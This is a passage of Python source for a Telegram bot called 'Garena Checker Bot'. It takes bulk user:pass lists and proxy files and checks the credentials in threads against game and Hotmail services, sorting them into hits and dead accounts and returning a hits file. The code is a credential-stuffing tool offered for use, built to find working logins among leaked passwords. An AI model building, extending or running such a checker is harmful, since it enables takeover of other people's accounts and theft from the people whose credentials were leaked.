🌐 Proxy: {proxy_count}

📌 <b>LENH SU DUNG:</b>

<b>CHECK TAI KHOAN:</b>
/check user:pass - Check 1 acc
/check user|pass - Check 1 acc (dau |)
/check user:pass service - Check 1 acc theo service
/checkmulti user1:pass1,user2:pass2 - Check nhieu acc
/checkall - Check tat ca acc dang cho

<b>SERVICE:</b>
lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack
""")

@bot.message_handler(commands=['check'])
def cmd_check(message):
    """Lệnh /check user:pass hoặc user|pass [service]"""
    if not check_membership(message):
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, """
❌ CACH DUNG:
/check user:pass
/check user|pass
/check user:pass lienquan
""")
        return
    
    account_str = parts[1]
    service = parts[2] if len(parts) > 2 else "lienquan"
    
    if service not in SERVICE_ROUTES:
        safe_send_message(message.chat.id, f"""
❌ SERVICE KHONG HOP LE!
Cac service: {', '.join(SERVICE_ROUTES.keys())}
""")
        return
    
    # Thay | bằng : để lọc
    account_input = account_str.replace('|', ':')
    
    accounts, stats_loc = loc_tk_mk_only(account_input)
    
    if not accounts:
        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass hoặc user|pass")
        return
    
    user, pwd = accounts[0]
    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service)).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    """Lệnh /checkmulti - Hỗ trợ nhiều định dạng"""
    if not check_membership(message):
        return
    
    text = message.text.strip()
    
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    
    if not text:
        safe_send_message(message.chat.id, """
❌ CACH DUNG:
/checkmulti user1:pass1
user2:pass2
user3|pass3

Hoặc:
/checkmulti user1:pass1,user2|pass2,user3:pass3

Hoặc:
/checkmulti user1:pass1,user2:pass2 lienquan
""")
        return
    
    lines = text.split('\n')
    service = "lienquan"
    
    if lines:
        last_line = lines[-1].strip()
        last_word = last_line.split()[-1] if last_line.split() else ""
        
        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
            service = last_word
            lines = lines[:-1]
        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
            service = last_word
            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
    
    accounts_input = '\n'.join(lines)
    accounts_input = accounts_input.replace(',', '\n')
    
    # Thay | bằng :
    accounts_input = accounts_input.replace('|', ':')
    
    accounts, stats_loc = loc_tk_mk_only(accounts_input)
    
    if not accounts:
        safe_send_message(message.chat.id, """
❌ KHONG TIM THAY ACC HOP LE!
Format: user:pass hoặc user|pass
""")
        return
    
    total = len(accounts)
    
    safe_send_message(message.chat.id, f"""
📊 <b>CHECK NHIEU ACC</b>
🎯 Tong: <code>{total}</code> accounts
🎮 Service: <b>{SERVICE_ROUTES[service]['desc']}</b>

Dang bat dau check...
""")
    
    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    """Lệnh /checkall"""
    if not check_membership(message):
        return
    
    global pending_accounts
    
    chat_id = message.chat.id
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accounts = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
    else:
        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")

@bot.message_handler(commands=['proxy'])
def cmd_proxy(message):
    """Lệnh /proxy"""
    if not check_membership(message):
        return
    
    safe_send_message(message.chat.id, """
📤 <b>LOAD PROXY</b>

📡 Proxy cá nhân: 1

<b>Gửi file .txt với format:</b>
ip:port
hoặc
ip:port:user:pass
""")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    """Lệnh /status"""
    if not check_membership(message):
        return
    
    if checking:
        elapsed = time.time() - stats.get("start_time", time.time())
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        with proxy_lock:
            proxy_count = len(proxy_list)
        safe_send_message(message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: YES
✅ Checked: {stats['checked']}/{stats['total']}
🎯 HIT: {stats['hits']}
❌ DEAD: {stats['dead']}
🌐 Proxy: {proxy_count}
⚡ Speed: {speed:.1f} acc/s
""")
    else:
        with proxy_lock:
            proxy_count = len(proxy_list)
        safe_send_message(message.chat.id, f"""
💤 Bot dang ranh
🌐 Proxy: {proxy_count}
""")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    """Lệnh /stop"""
    if not check_membership(message):
        return
    
    stop_event.set()
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    """Lệnh /services"""
    if not check_membership(message):
        return
    
    msg = "📋 <b>DANH SACH SERVICE:</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
    
    safe_send_message(message.chat.id, msg)

@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    """Lệnh /hits"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co hits!")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    """Lệnh /dead"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_DEAD, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co dead!")

@bot.message_handler(commands=['loc'])
def cmd_loc(message):
    """Lệnh /loc"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_LOC, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📥 loc_accounts.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co file loc!")

@bot.message_handler(commands=['report'])
def cmd_report(message):
    """Lệnh /report"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_RESULT, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📊 report.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co report!")

# ========== XỬ LÝ TEXT ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    """Xử lý tin nhắn văn bản"""
    if not check_membership(message):
        return
    
    global pending_accounts
    
    text = message.text.strip()
    chat_id = message.chat.id
    
    if text.startswith('/'):
        return
    
    # Thay | bằng : để lọc
    text_input = text.replace('|', ':')
    
    accounts, stats_loc = loc_tk_mk_only(text_input)
    
    if not accounts:
        safe_send_message(chat_id, """
❌ KHONG TIM THAY TAI KHOAN!

Dung lenh:
/check user:pass - Check 1 acc
/check user|pass - Check 1 acc (dau |)
/checkmulti user1:pass1,user2:pass2 - Check nhieu acc
""")
        return
    
    if chat_id not in pending_accounts:
        pending_accounts[chat_id] = []
    pending_accounts[chat_id] = accounts
    save_loc_file(accounts)
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📊 DA LOC {total} ACCOUNTS
✅ Valid: {stats_loc['valid']}
❌ Invalid: {stats_loc['invalid']}
🔄 Duplicate: {stats_loc['duplicate']}

Preview (10 dong dau):
{preview}

👇 Dung lenh de check:
/checkall - Check tat ca service
/checkmulti user1:pass1,user2:pass2 service - Check service cu the

Service: lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack
"""
    
    safe_send_message(chat_id, msg)

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Xử lý file tài liệu"""
    if not check_membership(message):
        return
    
    global pending_accounts
    
    chat_id = message.chat.id
    
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        
        # Kiểm tra proxy
        proxy_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'
        if re.search(proxy_pattern, content):
            proxy_count = load_proxy_from_text(content)
            save_proxy_file()
            safe_send_message(chat_id, f"""
✅ LOAD PROXY THANH CONG!
🌐 Tong proxy: {proxy_count}
""")
            return
        
        # Thay | bằng :
        content_input = content.replace('|', ':')
        
        # Lọc tài khoản
        accounts, stats_loc = loc_tk_mk_only(content_input)
        
        if not accounts:
            safe_send_message(chat_id, "❌ Khong tim thay user:pass trong file!")
            return
        
        if chat_id not in pending_accounts:
            pending_accounts[chat_id] = []
        pending_accounts[chat_id] = accounts
        save_loc_file(accounts)
        
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ LOC XONG!
📊 Tong: {total} accounts
✅ Valid: {stats_loc['valid']}
❌ Invalid: {stats_loc['invalid']}
🔄 Duplicate: {stats_loc['duplicate']}

Preview (20 dong dau):
{preview}

👇 Dung lenh de check:
/checkall - Check tat ca service
/checkmulti user1:pass1,user2:pass2 service - Check service cu the
"""
        
        safe_send_message(chat_id, msg)
        
        with open(OUTPUT_LOC, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"📥 loc_accounts.txt ({total} accounts)")
            except:
                pass
        
    except Exception as e:
        safe_send_message(chat_id, f"❌ Loi: {e}")

# ========== MAIN ==========
def main():
    """Hàm chính khởi động bot"""
    print("=" * 60)
    print("    GARENA CHECKER BOT V4.8 - CHECK FIX")
    print("    ADMIN: @baohuyno1")
    print("    HO TRO | VA :")
    print("    KENH BAT BUOC: @hakiiosvip")
    print("=" * 60)
    print(f"[*] Threads: {DEFAULT_THREADS}")
    print(f"[*] Timeout: {DEFAULT_TIMEOUT}s")
    print(f"[*] Services: {len(SERVICE_ROUTES)}")
    print(f"[*] API Base: {API_BASE}")
    print(f"[*] Required Channel: {REQUIRED_CHANNEL}")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
